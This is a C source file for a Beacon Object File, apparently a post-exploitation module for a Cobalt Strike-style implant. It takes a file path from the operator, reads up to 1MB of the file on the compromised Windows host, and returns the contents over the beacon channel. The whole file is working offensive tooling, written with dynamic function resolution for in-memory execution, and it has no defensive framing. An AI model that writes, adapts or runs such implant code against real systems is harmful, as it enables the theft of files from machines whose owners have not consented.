#include <windows.h>
#include "beacon.h"

// Dynamic Function Resolution (DFR) declarations
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$GetFileSizeEx(HANDLE, PLARGE_INTEGER);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError();

#define GetLastError KERNEL32$GetLastError
#define MAX_BUFFER_LIMIT 1000000 

void go(char* args, int len) {
    datap parser;
    char* fileName = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    // it will take arguments here
    BeaconDataParse(&parser, args, len);
    fileName = BeaconDataExtract(&parser, NULL);

    if (fileName == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to extract file path from arguments (len: %d). Ensure you are using the CNA script and it is reloaded!\n", len);
        return;
    }

    // it will open a file
    hFile = KERNEL32$CreateFileA(fileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Open Failed for %s. Error: %lu\n", fileName, GetLastError());
        return;
    }

    // size
    LARGE_INTEGER fileSize;
    if (!KERNEL32$GetFileSizeEx(hFile, &fileSize)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Size Error: %lu\n", GetLastError());
        KERNEL32$CloseHandle(hFile);
        return;
    }

    LONGLONG ullTotalSize = fileSize.QuadPart;
    if (ullTotalSize > MAX_BUFFER_LIMIT) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] File is too big, only reading first 1MB\n");
        ullTotalSize = MAX_BUFFER_LIMIT;
    }

    
    BYTE* buffer = (BYTE*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)ullTotalSize);
    if (buffer == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Could not allocate memory for file buffer.\n");
        KERNEL32$CloseHandle(hFile);
        return;
    }

    // read
    DWORD bytesRead = 0;
    if (!KERNEL32$ReadFile(hFile, buffer, (DWORD)ullTotalSize, &bytesRead, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Read Error: %lu\n", GetLastError());
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
        KERNEL32$CloseHandle(hFile);
        return;
    }

    // send output to beacon
    BeaconOutput(CALLBACK_OUTPUT, (char*)buffer, bytesRead);

    // clean
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, buffer);
    KERNEL32$CloseHandle(hFile);
    return;
}
